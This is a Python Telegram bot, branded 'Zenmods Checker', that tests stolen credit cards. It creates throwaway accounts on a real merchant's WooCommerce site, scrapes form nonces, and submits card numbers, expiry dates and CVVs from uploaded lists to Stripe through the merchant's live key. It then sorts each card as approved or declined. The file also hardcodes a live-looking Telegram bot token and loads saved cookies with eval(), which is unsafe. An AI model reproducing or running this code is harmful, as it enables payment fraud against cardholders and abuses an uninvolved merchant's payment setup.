from datetime import datetime, timedelta
import io
import os
import random
import re
import string
import threading
import time
from bs4 import BeautifulSoup
import requests
import telebot

TELEGRAM_BOT_TOKEN = "8664861867:AAF5Wq79aekFKDcE6vFT2jFO_3w4jjFgLmk"
SECRET_CODE = "Zenmods123"
authorized_users = set()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="Markdown")
print_lock = threading.Lock()

anasxzer00 = f"""
Join Channel for new updates.
"""

def mc_tools():
    banner = anasxzer00
    print_red(banner)

def by_anasxzer00(text):
    for char in text:
        print(f'\033[91m{char}\033[0m', end='', flush=True)
        time.sleep(0.03)
    print()

def print_line():
    print_red(f"""|-|==========================================|-|""")

def print_sline():
    print_cyan(f"""|----------------------------------------------|""")

def print_red(text): print(f"\033[91m{text}\033[0m")
def print_green(text): print(f"\033[92m{text}\033[0m")
def print_yellow(text): print(f"\033[93m{text}\033[0m")
def print_blue(text): print(f"\033[94m{text}\033[0m")
def print_magenta(text): print(f"\033[95m{text}\033[0m")
def print_cyan(text): print(f"\033[96m{text}\033[0m")
def print_white(text): print(f"\033[97m{text}\033[0m")
def print_grey(text): print(f"\033[90m{text}\033[0m")

def gggggggggggggggggg(length=9, domain=None):
    common_domains = ["gmail.com"]
    if not domain:
        domain = random.choice(common_domains)
    username_characters = string.ascii_letters + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))
    return f"{username}@{domain}"

def create_session():
    try:
        session = requests.Session()
        email = gggggggggggggggggg()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        }
        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        if response.status_code != 200:
            return None, f"Register GET status code: {response.status_code}"
            
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')
        
        nonce_tag = soup.find('input', {'id': 'afurd_field_nonce'})
        noncee_tag = soup.find('input', {'id': 'woocommerce-register-nonce'})
        
        if not nonce_tag or not noncee_tag:
            return None, "Nonce input fields not found in HTML structure"
            
        nonce = nonce_tag['value']
        noncee = noncee_tag['value']
        
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/register/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        }
        data = [
            ('afurd_field_nonce', f'{nonce}'),
            ('_wp_http_referer', '/register/'),
            ('pre_page', ''),
            ('email', f'{email}'),
            ('password', 'rokyNoa5954J'),
            ('wc_order_attribution_source_type', 'typein'),
            ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
            ('wc_order_attribution_utm_campaign', '(none)'),
            ('wc_order_attribution_utm_source', '(direct)'),
            ('wc_order_attribution_utm_medium', '(none)'),
            ('wc_order_attribution_utm_content', '(none)'),
            ('wc_order_attribution_utm_id', '(none)'),
            ('wc_order_attribution_utm_term', '(none)'),
            ('wc_order_attribution_utm_source_platform', '(none)'),
            ('wc_order_attribution_utm_creative_format', '(none)'),
            ('wc_order_attribution_utm_marketing_tactic', '(none)'),
            ('wc_order_attribution_session_entry', 'https://www.thetravelinstitute.com/my-account/add-payment-method/'),
            ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
            ('wc_order_attribution_session_pages', '8'),
            ('wc_order_attribution_session_count', '1'),
            ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'),
            ('woocommerce-register-nonce', f'{noncee}'),
            ('_wp_http_referer', '/register/'),
            ('register', 'Register'),
        ]
        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            return session, "Success"
        else:
            return None, f"Register POST status code: {response.status_code}"
    except Exception as e:
        return None, str(e)

def save_session_to_file(session, file_path):
    with open(file_path, "w") as file:
        cookies = session.cookies.get_dict()
        file.write(str(cookies))

def load_session_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            session_data = file.read().strip()
            session = requests.Session()
            cookies = eval(session_data)
            session.cookies.update(cookies)
            return session
    except Exception as e:
        return None

def manage_session_file():
    session_file = "anasxzer00-session.txt"
    if os.path.exists(session_file):
        session = load_session_from_file(session_file)
        if session:
            return session, "Loaded from cache"
    session, err_msg = create_session()
    if session:
        save_session_to_file(session, session_file)
        return session, "Created new session"
    else:
        return None, err_msg

def check_single_cc(cc_line, session):
    try:
        card = cc_line.replace('/', '|')
        lista = card.split("|")
        if len(lista) < 4:
            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nProblem Detail: Invalid format structure (Expected card|mm|yy|cvv)"
        
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]

        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        }
        response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
        html = response.text
        nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
        if not nonce_match:
            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Nonce extraction failed. Account page might require re-authentication or session expired."
        nonce = nonce_match.group(1)

        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'x-stripe-client-user-agent': '{"init_source":"elements-inner","plugin_name":"stripe.js","lang":"en","bindings_version":"2.20.0","os":"win","browser":"chrome"}',
        }
        data_stripe = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        
        stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=20)
        res = stripe_response.text
        
        if 'error' in res:
            try:
                error = stripe_response.json()['error']['message']
            except Exception:
                error = "Unknown Stripe Tokenization Error"
            
            if 'code' in error:
                return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nProblem Detail: Card requires security code or authentication challenge -> {error}"
            else:
                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Stripe Declined -> {error}"
        else:
            try:
                iddd = stripe_response.json()['id']
            except Exception:
                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Payment method ID extraction failed from Stripe response."

            headers_confirm = {
                'authority': 'www.thetravelinstitute.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.thetravelinstitute.com',
                'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            params = {
                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            }
            data_confirm = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': iddd,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce,
            }
            confirm_response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers_confirm, data=data_confirm, timeout=20)
            
            try:
                res_json = confirm_response.json()
            except Exception:
                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Invalid confirmation response from website server."

            if res_json.get('success') == False:
                error = res_json.get('data', {}).get('error', {}).get('message', 'Unknown confirmation error')
                if 'code' in error:
                    return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nProblem Detail: Confirmation error code -> {error}"
                else:
                    return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Confirmation declined -> {error}"
            else:
                return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nProblem Detail: None. Successfully approved!"
    except Exception as e:
        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nProblem Detail: Exception caught -> {str(e)}"

def process_bulk_file(chat_id, file_content):
    lines = [line.strip() for line in file_content.decode("utf-8").splitlines() if line.strip()]
    total_cards = len(lines)

    if total_cards == 0:
        bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
        return

    bot.send_message(chat_id, f"⚡ **Zenmods Detailed Diagnostic Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Initializing session and checking...")

    session, session_status = manage_session_file()
    if not session:
        bot.send_message(chat_id, f"❌ **Session creation failed!**\n\n🔍 **Diagnostic Reason:** `{session_status}`")
        return
    else:
        bot.send_message(chat_id, f"✅ Session established successfully! Status: `{session_status}`")

    for index, card_line in enumerate(lines, start=1):
        res = check_single_cc(card_line, session)
        bot.send_message(chat_id, f"📌 **Report [{index}/{total_cards}]**:\n\n{res}")
        time.sleep(2)

    bot.send_message(chat_id, "🏁 **Finished checking all cards with problem breakdown!**")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to Zenmods Checker Bot! Send /auth <code > to authorize or upload a text file with combos.")

@bot.message_handler(commands=['auth'])
def authorize_user(message):
    try:
        parts = message.text.split()
        if len(parts) > 1 and parts[1] == SECRET_CODE:
            authorized_users.add(message.chat.id)
            bot.reply_to(message, "✅ Authorization successful! You can now send card lists.")
        else:
            bot.reply_to(message, "❌ Invalid secret code!")
    except Exception as e:
        bot.reply_to(message, "⚠️ An error occurred.")

@bot.message_handler(commands=['chk'])
def handle_single_card_cmd(message):
    chat_id = message.chat.id
    if chat_id not in authorized_users:
        bot.reply_to(message, "⛔ You are not authorized! Use `/auth <secret_code>` first.")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Format: `/chk card|mm|yy|cvv`")
        return
    
    card_line = parts[1].strip()
    bot.send_message(chat_id, "🔍 Checking single card with diagnostics...")
    session, session_status = manage_session_file()
    if not session:
        bot.send_message(chat_id, f"❌ **Session creation failed!**\n\n🔍 **Diagnostic Reason:** `{session_status}`")
        return
    
    res = check_single_cc(card_line, session)
    bot.send_message(chat_id, f"📌 **Detailed Single Report:**\n\n{res}")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    if chat_id not in authorized_users:
        bot.reply_to(message, "⛔ You are not authorized! Use `/auth <secret_code>` first.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        process_bulk_file(chat_id, downloaded_file)
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error processing file: {str(e)}")

if __name__ == "__main__":
    mc_tools()
    print_line()
    by_anasxzer00(' -- Zenmods Telegram Bot Engine Initialized Successfully!')
    bot.infinity_polling()
